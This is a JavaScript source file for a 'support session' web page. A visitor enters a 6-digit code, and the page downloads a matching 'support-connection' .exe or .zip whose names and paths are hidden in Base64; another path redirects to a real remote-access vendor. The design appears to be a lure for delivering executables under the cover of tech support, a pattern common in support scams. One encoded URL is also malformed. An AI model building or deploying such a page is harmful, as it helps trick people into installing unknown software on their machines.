/**
 * ============================================================================
 * SUPPORT & HELPDESK SESSION PORTAL (PURE JS ENGINE)
 * ============================================================================
 * 
 * HOW TO UPDATE BASE64 ENCODED CODES AND URLS:
 * ----------------------------------------------------------------------------
 * Each entry in ENCODED_SUPPORT_DATA maps a Base64-encoded 6-digit code to a
 * Base64-encoded filename and download URL.
 * 
 * Base64 helper:
 *   btoa("111980")                     -> "MTExOTgw"
 *   btoa("support-connection-980.exe") -> "c3VwcG9ydC1jb25uZWN0aW9uLTk4MC5leGU="
 *   btoa("assets/connect_me/support-connection-980.exe") -> "YXNzZXRzL2Nvbm5lY3RfbWUvc3VwcG9ydC1jb25uZWN0aW9uLTk4MC5leGU="
 * ============================================================================
 */

const ENCODED_SUPPORT_DATA = {
  // Code: 111980 -> support-connection-980.exe
  'MTExOTgw': {
    name: 'c3VwcG9ydC1jb25uZWN0aW9uLTk4MC5leGU=',
    url: 'YXNzZXRzL2Nvbm5lY3RfbWUvc3VwcG9ydC1jb25uZWN0aW9uLTk4MC5leGU=',
  },
  // Code: 222980 -> support-connection-980.zip
  'MjIyOTgw': {
    name: 'c3VwcG9ydC1jb25uZWN0aW9uLTk4MC56aXA=',
    url: 'YXNzZXRzL2Nvbm5lY3RfbWUvc3VwcG9ydC1jb25uZWN0aW9uLTk4MC56aXA=',
  },
  // Code: 111981 -> support-connection-981.exe
  'MTExOTgx': {
    name: 'c3VwcG9ydC1jb25uZWN0aW9uLTk4MS5leGU=',
    url: 'YXNzZXRzL2Nvbm5lY3RfbWUvc3VwcG9ydC1jb25uZWN0aW9uLTk4MS5leGU=',
  },
  // Code: 222981 -> support-connection-981.zip
  'MjIyOTgx': {
    name: 'c3VwcG9ydC1jb25uZWN0aW9uLTk4MS56aXA=',
    url: 'YXNzZXRzL2Nvbm5lY3RfbWUvc3VwcG9ydC1jb25uZWN0aW9uLTk4MS56aXA=',
  },
  // Code: 111982 -> support-connection-982.exe
  'MTExOTgy': {
    name: 'c3VwcG9ydC1jb25uZWN0aW9uLTk4Mi5leGU=',
    url: 'YXNzZXRzL2Nvbm5lY3RfbWUvc3VwcG9ydC1jb25uZWN0aW9uLTk4Mi5leGU=',
  },
  // Code: 222982 -> support-connection-982.zip
  'MjIyOTgy': {
    name: 'c3VwcG9ydC1jb25uZWN0aW9uLTk4Mi56aXA=',
    url: 'YXNzZXRzL2Nvbm5lY3RfbWUvc3VwcG9ydC1jb25uZWN0aW9uLTk4Mi56aXA=',
  },
  // Code: 111983 -> support-connection-983.exe
  'MTExOTgz': {
    name: 'c3VwcG9ydC1jb25uZWN0aW9uLTk4My5leGU=',
    url: 'YXNzZXRzL2Nvbm5lY3RfbWUvc3VwcG9ydC1jb25uZWN0aW9uLTk4My5leGU=',
  },
  // Code: 222983 -> support-connection-983.zip
  'MjIyOTgz': {
    name: 'c3VwcG9ydC1jb25uZWN0aW9uLTk4My56aXA=',
    url: 'YXNzZXRzL2Nvbm5lY3RfbWUvc3VwcG9ydC1jb25uZWN0aW9uLTk4My56aXA=',
  },
  // Code: 111984 -> support-connection-984.exe
  'MTExOTg0': {
    name: 'c3VwcG9ydC1jb25uZWN0aW9uLTk4NC5leGU=',
    url: 'YXNzZXRzL2Nvbm5lY3RfbWUvc3VwcG9ydC1jb25uZWN0aW9uLTk4NC5leGU=',
  },
  // Code: 222984 -> support-connection-984.zip
  'MjIyOTg0': {
    name: 'c3VwcG9ydC1jb25uZWN0aW9uLTk4NC56aXA=',
    url: 'YXNzZXRzL2Nvbm5lY3RfbWUvc3VwcG9ydC1jb25uZWN0aW9uLTk4Quemlw',
  },
};

/**
 * Safely decodes a Base64 string
 */
function decodeBase64(str) {
  try {
    return atob(str);
  } catch (e) {
    console.error('Failed to decode base64 string:', e);
    return '';
  }
}

/**
 * Triggers file download for the resolved file
 */
function triggerFileDownload(fileUrl, fileName) {
  if (fileUrl.includes('example.com') || fileUrl.startsWith('data:') || fileUrl.startsWith('blob:')) {
    const isZip = fileName.toLowerCase().endsWith('.zip');
    const dummyContent = `SUPPORT CONNECTION CLIENT PACKAGE\n\nFile: ${fileName}\nDownloaded: ${new Date().toLocaleString()}\nSession: Active`;
    const mimeType = isZip ? 'application/zip' : 'application/x-msdownload';
    const blob = new Blob([dummyContent], { type: mimeType });
    const objectUrl = URL.createObjectURL(blob);
    
    const link = document.createElement('a');
    link.href = objectUrl;
    link.download = fileName;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    setTimeout(() => URL.revokeObjectURL(objectUrl), 1500);
  } else {
    // Direct URL / relative file download
    const link = document.createElement('a');
    link.href = fileUrl;
    link.download = fileName;
    link.target = '_blank';
    link.rel = 'noopener noreferrer';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }
}

// DOM Elements
const selectionCard = document.getElementById('selection-card');
const helpdeskCard = document.getElementById('helpdesk-card');
const supportCard = document.getElementById('support-card');

// HelpDesk Elements
const helpdeskInput = document.getElementById('helpdesk-code-input');
const helpdeskSubmitBtn = document.getElementById('btn-start-helpdesk-session');
const helpdeskBtnText = document.getElementById('helpdesk-btn-text');
const helpdeskErrorMsg = document.getElementById('helpdesk-error-message');
const helpdeskSuccessMsg = document.getElementById('helpdesk-success-message');
const helpdeskBars = document.querySelectorAll('.indicator-bar.hd-bar');

// Support Elements
const supportInput = document.getElementById('support-code-input');
const supportSubmitBtn = document.getElementById('btn-start-support-session');
const supportBtnText = document.getElementById('support-btn-text');
const supportErrorMsg = document.getElementById('support-error-message');
const supportSuccessMsg = document.getElementById('support-success-message');
const supportBars = document.querySelectorAll('#support-card .indicator-bar:not(.hd-bar)');

// State variables
let currentMode = 'selection';
let rawHelpdeskCode = '';
let rawSupportCode = '';
let isHelpdeskLoading = false;
let isSupportLoading = false;

/**
 * View Switcher
 */
function switchView(mode) {
  currentMode = mode;
  document.title = 'Support Connection';

  // Toggle Visibility
  if (mode === 'selection') {
    selectionCard.classList.remove('hidden');
    helpdeskCard.classList.add('hidden');
    supportCard.classList.add('hidden');
    resetHelpdeskState();
    resetSupportState();
  } else if (mode === 'helpdesk') {
    selectionCard.classList.add('hidden');
    helpdeskCard.classList.remove('hidden');
    supportCard.classList.add('hidden');
    resetHelpdeskState();
    setTimeout(() => helpdeskInput && helpdeskInput.focus(), 60);
  } else if (mode === 'support') {
    selectionCard.classList.add('hidden');
    helpdeskCard.classList.add('hidden');
    supportCard.classList.remove('hidden');
    resetSupportState();
    setTimeout(() => supportInput && supportInput.focus(), 60);
  }
}

/**
 * Reset HelpDesk View State
 */
function resetHelpdeskState() {
  rawHelpdeskCode = '';
  isHelpdeskLoading = false;
  if (helpdeskInput) {
    helpdeskInput.value = '';
    helpdeskInput.disabled = false;
    helpdeskInput.classList.remove('error', 'animate-shake');
  }
  if (helpdeskErrorMsg) helpdeskErrorMsg.classList.remove('visible');
  if (helpdeskSuccessMsg) helpdeskSuccessMsg.classList.remove('visible');
  if (helpdeskSubmitBtn) {
    helpdeskSubmitBtn.disabled = true;
    helpdeskBtnText.textContent = 'Start HelpDesk Session';
  }
  updateHelpdeskIndicators(0);
}

/**
 * Reset Support View State
 */
function resetSupportState() {
  rawSupportCode = '';
  isSupportLoading = false;
  if (supportInput) {
    supportInput.value = '';
    supportInput.disabled = false;
    supportInput.classList.remove('error', 'animate-shake');
  }
  if (supportErrorMsg) supportErrorMsg.classList.remove('visible');
  if (supportSuccessMsg) supportSuccessMsg.classList.remove('visible');
  if (supportSubmitBtn) {
    supportSubmitBtn.disabled = true;
    supportBtnText.textContent = 'Start Support Session';
  }
  updateSupportIndicators(0);
}

/**
 * Format 9-digit HelpDesk code as XXX-XXX-XXX
 */
function formatHelpdeskDisplay(raw) {
  if (raw.length <= 3) return raw;
  if (raw.length <= 6) return `${raw.slice(0, 3)}-${raw.slice(3)}`;
  return `${raw.slice(0, 3)}-${raw.slice(3, 6)}-${raw.slice(6, 9)}`;
}

/**
 * Update 9-digit visual indicators
 */
function updateHelpdeskIndicators(length) {
  helpdeskBars.forEach((bar, idx) => {
    bar.classList.remove('active-filled', 'active-cursor');
    if (length > idx) {
      bar.classList.add('active-filled');
    } else if (length === idx) {
      bar.classList.add('active-cursor');
    }
  });
}

/**
 * Update 6-digit visual indicators
 */
function updateSupportIndicators(length) {
  supportBars.forEach((bar, idx) => {
    bar.classList.remove('active-filled', 'active-cursor');
    if (length > idx) {
      bar.classList.add('active-filled');
    } else if (length === idx) {
      bar.classList.add('active-cursor');
    }
  });
}

/**
 * Trigger shake effect on element
 */
function triggerShake(element) {
  element.classList.remove('animate-shake');
  void element.offsetWidth; // Trigger reflow
  element.classList.add('animate-shake');
  setTimeout(() => element.classList.remove('animate-shake'), 450);
}

// ----------------------------------------------------------------------------
// HELPDESK EVENT HANDLERS
// ----------------------------------------------------------------------------
if (helpdeskInput) {
  helpdeskInput.addEventListener('input', function () {
    rawHelpdeskCode = this.value.replace(/\D/g, '').slice(0, 9);
    this.value = formatHelpdeskDisplay(rawHelpdeskCode);
    updateHelpdeskIndicators(rawHelpdeskCode.length);

    if (helpdeskErrorMsg) helpdeskErrorMsg.classList.remove('visible');
    if (helpdeskSuccessMsg) helpdeskSuccessMsg.classList.remove('visible');
    helpdeskInput.classList.remove('error');

    if (helpdeskSubmitBtn) {
      helpdeskSubmitBtn.disabled = rawHelpdeskCode.length !== 9 || isHelpdeskLoading;
    }
  });

  helpdeskInput.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleHelpdeskSubmit();
    }
  });
}

function handleHelpdeskSubmit() {
  if (rawHelpdeskCode.length !== 9 || isHelpdeskLoading) return;

  isHelpdeskLoading = true;
  helpdeskInput.disabled = true;
  helpdeskSubmitBtn.disabled = true;
  helpdeskBtnText.innerHTML = `
    <span class="spinner"></span>
    <span>Connecting to HelpDesk...</span>
  `;

  if (helpdeskErrorMsg) helpdeskErrorMsg.classList.remove('visible');
  if (helpdeskSuccessMsg) helpdeskSuccessMsg.classList.add('visible');

  // Format 9-digit code with hyphens: e.g. 123-456-789
  const formattedId = `${rawHelpdeskCode.slice(0, 3)}-${rawHelpdeskCode.slice(3, 6)}-${rawHelpdeskCode.slice(6, 9)}`;
  const targetUrl = `https://app.remotepc.com/hd-app/help?id=${formattedId}`;

  setTimeout(() => {
    window.location.href = targetUrl;
  }, 600);
}

if (document.getElementById('helpdesk-form')) {
  document.getElementById('helpdesk-form').addEventListener('submit', function (e) {
    e.preventDefault();
    handleHelpdeskSubmit();
  });
}

// ----------------------------------------------------------------------------
// SUPPORT EVENT HANDLERS
// ----------------------------------------------------------------------------
if (supportInput) {
  supportInput.addEventListener('input', function () {
    rawSupportCode = this.value.replace(/\D/g, '').slice(0, 6);
    this.value = rawSupportCode;
    updateSupportIndicators(rawSupportCode.length);

    if (supportErrorMsg) supportErrorMsg.classList.remove('visible');
    if (supportSuccessMsg) supportSuccessMsg.classList.remove('visible');
    supportInput.classList.remove('error');

    if (supportSubmitBtn) {
      supportSubmitBtn.disabled = rawSupportCode.length !== 6 || isSupportLoading;
    }
  });

  supportInput.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleSupportSubmit();
    }
  });
}

function handleSupportSubmit() {
  if (rawSupportCode.length !== 6 || isSupportLoading) return;

  isSupportLoading = true;
  supportInput.disabled = true;
  supportSubmitBtn.disabled = true;
  supportBtnText.innerHTML = `
    <span class="spinner"></span>
    <span>Connecting...</span>
  `;

  if (supportErrorMsg) supportErrorMsg.classList.remove('visible');
  if (supportSuccessMsg) supportSuccessMsg.classList.remove('visible');

  const encodedInputCode = btoa(rawSupportCode);
  const matchedRecord = ENCODED_SUPPORT_DATA[encodedInputCode];

  setTimeout(() => {
    isSupportLoading = false;
    supportInput.disabled = false;

    if (matchedRecord) {
      const decodedFileName = decodeBase64(matchedRecord.name);
      const decodedFileUrl = decodeBase64(matchedRecord.url);
      triggerFileDownload(decodedFileUrl, decodedFileName);

      supportBtnText.textContent = 'Start Support Session';
      supportSubmitBtn.disabled = false;
      if (supportSuccessMsg) supportSuccessMsg.classList.add('visible');
    } else {
      supportBtnText.textContent = 'Start Support Session';
      supportSubmitBtn.disabled = false;
      if (supportErrorMsg) supportErrorMsg.classList.add('visible');
      supportInput.classList.add('error');
      triggerShake(supportInput);
      supportInput.focus();
    }
  }, 550);
}

if (document.getElementById('support-form')) {
  document.getElementById('support-form').addEventListener('submit', function (e) {
    e.preventDefault();
    handleSupportSubmit();
  });
}

// Global Keyboard Navigation (Escape key to go back)
document.addEventListener('keydown', function (e) {
  if (e.key === 'Escape' && currentMode !== 'selection') {
    switchView('selection');
  }
});
